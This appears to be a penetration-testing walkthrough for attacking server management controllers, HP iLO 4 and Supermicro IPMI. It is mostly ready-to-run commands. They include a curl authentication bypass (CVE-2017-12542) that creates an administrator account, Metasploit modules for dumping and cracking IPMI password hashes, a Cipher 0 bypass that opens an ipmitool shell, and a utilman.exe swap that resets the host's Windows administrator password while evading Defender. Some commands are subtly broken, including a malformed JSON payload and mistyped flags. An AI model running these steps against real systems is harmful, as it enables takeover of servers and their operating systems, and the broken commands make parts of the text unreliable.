# Attacking BMC and IPMI

HP iLO 4 has a web interface to monitor and configure managed servers. The version is already displayed on the screen. The default username for iLO web interface `administrator` is typically printed directly on the server.
The default password contains 8 random uppercase alphanumeric / numeric which is a pretty weak format. 
There are a large number of critical vulnerabilities, listed below:

| **iLO version** | **CVE**        | **Year** | **Vulnerability**                                            | **Score** | **Version**                                  |
| --------------- | -------------- | -------- | ------------------------------------------------------------ | --------- | -------------------------------------------- |
| **iLO 4/5**     | CVE-2019-11983 | 2019     | Remote buffer overflow vulnerability.                        | **8.3**   | iLO 4: < v2.61b iLO 5: < v1.39               |
| **iLO 3/4/5**   | CVE-2018-7105  | 2018     | Remotely exploitable vulnerability to execute arbitrary code leading to the disclosure of information. | **9**     | iLO 3: < v1.90 iLO 4: < v2.61 iLO 5: < v1.35 |
| **iLO 4/5**     | CVE-2018-7078  | 2018     | Remote code execution vulnerability.                         | **9**     | iLO 4: < v2.61 iLO 5: < v1.30                |
| **iLO 4**       | CVE-2017-12542 | 2017     | An authentication bypass and execution of code vulnerability with public exploit. | **10**    | iLO 4: < v2.53                               |
| **iLO 2/4**     | CVE-2014-7876  | 2014     | A remote user can execute arbitrary code on the target system, gain elevated privileges and cause a denial of service condition. | **10**    | iLO 2: < v2.27 iLO 4: < v2.03                |
| **iLO 3/4**     | CVE-2013-2338  | 2013     | Remote code execution vulnerability.                         | **10**    | iLO 3: < v1.57 iLO 4: < v1.22                |
| **iLO 3/4**     | CVE-2012-3271  | 2012     | The vulnerability allows remote attackers to obtain sensitive information. | **9.3**   | iLO 3: < v1.50 iLO 4: < v1.13                |

A complete list can be found [here](https://www.cvedetails.com/vulnerability-list/vendor_id-10/product_id-23648/HP-Integrated-Lights-out-4-Firmware.html)
With administrative access, the firmware can be replaced, erasing firmware components, or install ransomware. 
It is further possible to pivot to the host OS as well, which we will demonstrate using `CVE-2017-12542`, bypassing authentication, and creating a new administrator user on the system.

## Exploiting CVE-2017-12542

First we start a port-scan to determine open ports and services. BMC's typically expose 80/443, 23, or 22, 623 (IPMI UDP and TCP). Additionally, you might find SNMP (UDP 161/162), syslog (514), and Virtual Media (17988). It's not advised to to scan heavy using -A or -sV with -p- for all ports. Since we already have an idea of ports that will be available, we can scan with the following:
```bash 
# Scan for Open Ports
nmap -sU -sS -p U:623,161,162,T:80,443,22,23,514 [HP iLO IP]
# Service scan on open TCP ports
nmap -sV -p22,80,443,514,17988 [HP iLO IP]
# Service scan on UDP 
nmap -sUV -p U:623,161,162 [HP iLO IP]
```

Since we already know the HP iLO version, we can determine that it's vulnerable to an authentication bypass vulnerability. 

### Exploitation

We can confirm if the target is vulnerable using a single curl command:
```bash
# If successful, returns list of iLO user accounts
curl -k -i -H "Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://192.168.100.140/rest/v1/AccountService/Accounts
```

Since we know the target is vulnerable, we can issue requests as if we were authenticated. 
For example, we could generate a request to create a new user with admin privileges.

[Python Exploit](https://www.exploit-db.com/exploits/44005)

```shell
# We can execute - -e triggers the exploit function, while -t only tests
python 44005.py -u username -p password -e [HP iLO IP]
# Once executed, we can login as the new user to the iLO interface
```

Alternatively, we can use `hp_ilo_create_admin_account` Metasploit module:

```shell
use auxiliary/admin/hp/hp_ilo_create_admin_account
set rhost [HP iLO IP]
set username user1
set password 12345678
run
```

We could also just run a curl command:

```bash
curl -i -s -k -X $'POST' -H $'Host: [HP iLO IP]' -H $'Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' -H $'Content-Type: application/json' -H $'Content-Length: 233' --data-binary $'{\"Username\":\"user1\",\"Password\":\"12345678\",\"Oem\":{\"Hp\":{\"LoginName\":\"user1\",\"Privileges\":{\"LoginPriv\":true,\"RemoteConsolePriv\":true,\"UserConfigPriv\":true,\"VirtualMediaPriv\":true,\"VirtualPowerAndResetPriv\":true,\"iLOConfigPriv\",true}}}}\x0d\x0a' 'https://[HP iLO IP]/rest/v1/AccountService/Accounts'
```

## Pivoting to the Host OS

Now that we have access to iLO, we can pivot to compromise the server OS. Let's look at CVE-2013-4786. 
The `ipmi_dumphashes` module in Metasploit can be used to retrieve the password hash - we can setup the `OUTPUT_JOHN_FILE` to store the captured hases in the John format too. 

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts [HP iLO IP]
set OUTPUT_JOHN_FILE /root/Desktop/ilohash/ilohash.txt
run
# Crack with john - default iLO = 8 random uppercase alphanumeric / numeric
john --mask=?d?d?d?d?d?d?d?d ilohash.txt
```

http://fish2.com/ipmi/remote-pw-cracking.html

### Pivoting

Now we can take a look at the Remote Console feature to look at the screen of the host OS. 
We can launch a Java Remote Console to take us to the screen on the host. 
Next we could hopefully link `Ease of Access` button in the bottom right corner to the `cmd.exe`. `Utilman.exe` was patched however in September 2018, which incolved renaming the file as malware. We can still work around this. 

1. Boot the system using a boot disk - we can rename `cmd.exe` to `utilman.exe`. We can use the Windows Server 2019 installation ISO. 
2. In Virtual drives menu, we can mount the iamge file as CD/DVD-ROM - select the installation ISO, and choose `Momentary Press` in the `Power Switch` menu to reboot the server
3. When it reboots, we are presented with windows setup menu. From here, we choose `Repair your Computer`. 
4. Choose `Troubleshoot` followed by `Command Prompt`.
5. Renamed utilman: `move D:\Windows\System32\Utilman.exe D:\Windows\System32\Utilman.exe.old`
6. Create cmd.exe named `utilman`: `copy D:\Windows\System32\cmd.exe D:\Windows\System32\utilman.exe`
7. Reboot: `wpeutil reboot`
8. Remove the ISO from virtual drives , then boot in SAFE mode to prevent Windows Defender from flagging. In this mode, it takes about 30 seconds for Defender to start, and we can launch cmd.exe, change the password before the shell is terminated: `net user administrator AdminAdmin123!!!`

## Supermicro 

Supermicro also has a number of vulnerabilities. We can look at `CVE-2013-4782` - Authentication bypass via Cipher 0. The only information required to bypass is a valid username, but since it typically ships with a default admin account, this shouldn't be an issue. 

```shell 
# Check if Cipher 0 is enabled on the target
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set rhosts [Target IP]
run

# Install ipmitool 
apt-get install ipmitool 
# Check help options
ipmitool -h
# We need to provide -I to specify interface, -C for Cipher 0, -H for host IP, -U for username, -P for an arbitrary password, [IPMI command]
ipmitool -I lanplus -C 0  -H [target] -U ADMIN -P any lan print
# Retrieve list of users on IPMI interface
ipmitool -I lanplus -C 0 -H [Target IP] -U ADMIN -p any user list
# Finally, an interactive shell
ipmitool -I lanplus -C 0 -H [Target IP] -U ADMIN -P any shell
```

https://linux.die.net/man/1/ipmitool

http://fish2.com/ipmi/cipherzero.html

### Clear-text passwords on port 49152

Supermicro is subject to file exposure vulnerability on the web interface. 

```shell
# We will use the smt_ipmi_49152_exposure_module
use auxiliary/scanner/http/smt_ipmi_49152_exposure
set rhosts [Target IP]
run
# Verify returned credentials that were exposed using ipmitool
ipmitool -I lanplus -H [Target IP] U ADMIN -P P@ssw0rd user list
```

Other modules that are usable:

- use auxiliary/scanner/http/smt_ipmi_49152_exposure
- use auxiliary/scanner/http/smt_ipmi_cgi_scanner
- use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal
- use auxiliary/scanner/ipmi/ipmi_dumphashes
- use auxiliary/scanner/ipmi/ipmi_version
- use exploit/linux/http/smt_ipmi_close_window_bof